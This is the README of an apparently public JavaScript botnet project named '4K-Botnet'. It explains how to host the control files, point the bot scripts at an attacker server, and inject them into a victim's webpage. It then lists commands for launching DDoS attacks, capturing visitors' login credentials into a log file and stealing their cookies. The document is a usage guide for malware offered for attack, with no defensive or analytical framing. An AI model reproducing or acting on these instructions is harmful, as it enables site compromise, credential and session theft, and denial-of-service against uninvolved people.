# 4K-Botnet
A simple and easy to use JS Botnet

# How to Setup
1) Clone repository
2) Upload the "Botnet" folder to your webserver
3) Edit "bot.js" and/or "bot-d.js" (Change the "SERVER_URL" variable to your website's url)
4) Done

# How to use
1) Edit the "cmds.php" file - Each command must be on a seprate line
2) Inject "bot.js" or "bot-d.js" into the victim's webpage

# Commands
## DDoS - UNTESTED
+ Usage - cmds.php: DDoS(); url.php: URL
+ Put the url in the "url.php" file

## getCreds
+ Usage - cmds.php: getCreds()
+ Login info will be saved to "cred_log.txt" in the "Botnet" folder

## getCookies
+ Usage - cmds.php: getCookes()
